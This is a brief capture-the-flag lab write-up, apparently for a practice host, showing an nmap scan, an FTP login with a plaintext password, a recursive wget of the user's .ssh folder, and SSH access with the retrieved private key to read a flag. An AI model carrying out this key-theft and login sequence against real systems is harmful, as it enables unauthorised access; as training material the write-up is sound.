# easy

## nmap

```bash
┌──(kali㉿kali)-[~]
└─$ nmap -sV -sC -p- 10.129.106.144 -T4
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-10 19:13 +0200
Nmap scan report for 10.129.106.144
Host is up (0.088s latency).
Not shown: 65531 closed tcp ports (reset)
PORT     STATE SERVICE      VERSION
21/tcp   open  ftp?
| fingerprint-strings: 
|   GenericLines: 
|     220 ProFTPD Server (ftp.int.inlanefreight.htb) [10.129.106.144]
|     Invalid command: try being more creative
|_    Invalid command: try being more creative
22/tcp   open  ssh          OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 3f:4c:8f:10:f1:ae:be:cd:31:24:7c:a1:4e:ab:84:6d (RSA)
|   256 7b:30:37:67:50:b9:ad:91:c0:8f:f7:02:78:3b:7c:02 (ECDSA)
|_  256 88:9e:0e:07:fe:ca:d0:5c:60:ab:cf:10:99:cd:6c:a7 (ED25519)
53/tcp   open  domain       ISC BIND 9.16.1 (Ubuntu Linux)
| dns-nsid: 
|_  bind.version: 9.16.1-Ubuntu
2121/tcp open  ccproxy-ftp?
| fingerprint-strings: 
|   GenericLines: 
|     220 ProFTPD Server (Ceil's FTP) [10.129.106.144]
|     Invalid command: try being more creative
|_    Invalid command: try being more creative
2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port21-TCP:V=7.99%I=7%D=8/10%Time=6A7A08CA%P=x86_64-pc-linux-gnu%r(Gene
SF:ricLines,9D,"220\x20ProFTPD\x20Server\x20\(ftp\.int\.inlanefreight\.htb
SF:\)\x20\[10\.129\.106\.144\]\r\n500\x20Invalid\x20command:\x20try\x20bei
SF:ng\x20more\x20creative\r\n500\x20Invalid\x20command:\x20try\x20being\x2
SF:0more\x20creative\r\n");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port2121-TCP:V=7.99%I=7%D=8/10%Time=6A7A08CA%P=x86_64-pc-linux-gnu%r(Ge
SF:nericLines,8E,"220\x20ProFTPD\x20Server\x20\(Ceil's\x20FTP\)\x20\[10\.1
SF:29\.106\.144\]\r\n500\x20Invalid\x20command:\x20try\x20being\x20more\x2
SF:0creative\r\n500\x20Invalid\x20command:\x20try\x20being\x20more\x20crea
SF:tive\r\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 737.91 seconds
```


## 2121

```bash
┌──(kali㉿kali)-[~/footprint/exo1]
└─$ ftp 10.129.106.144 2121
Connected to 10.129.106.144.
220 ProFTPD Server (Ceil's FTP) [10.129.106.144]
Name (10.129.106.144:kali): ceil
331 Password required for ceil
Password: 
230 User ceil logged in
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -al
229 Entering Extended Passive Mode (|||31277|)
150 Opening ASCII mode data connection for file list
drwxr-xr-x   4 ceil     ceil         4096 Nov 10  2021 .
drwxr-xr-x   4 ceil     ceil         4096 Nov 10  2021 ..
-rw-------   1 ceil     ceil          294 Nov 10  2021 .bash_history
-rw-r--r--   1 ceil     ceil          220 Nov 10  2021 .bash_logout
-rw-r--r--   1 ceil     ceil         3771 Nov 10  2021 .bashrc
drwx------   2 ceil     ceil         4096 Nov 10  2021 .cache
-rw-r--r--   1 ceil     ceil          807 Nov 10  2021 .profile
drwx------   2 ceil     ceil         4096 Nov 10  2021 .ssh
-rw-------   1 ceil     ceil          759 Nov 10  2021 .viminfo
```

```bash
┌──(kali㉿kali)-[~/footprint/exo1]
└─$ wget -r --ftp-user="ceil" --ftp-password="qwer1234" ftp://10.129.106.144:2121/.ssh    
```

```bash
┌──(kali㉿kali)-[~/footprint/exo1/10.129.106.144:2121/.ssh]
└─$ ssh ceil@10.129.106.144 -i id_rsa
ceil@NIXEASY:~$ find /home -name "flag.txt"
/home/flag/flag.txt
find: ‘/home/cry0l1t3/.cache’: Permission denied
ceil@NIXEASY:~$ cat /home/flag/flag.txt
```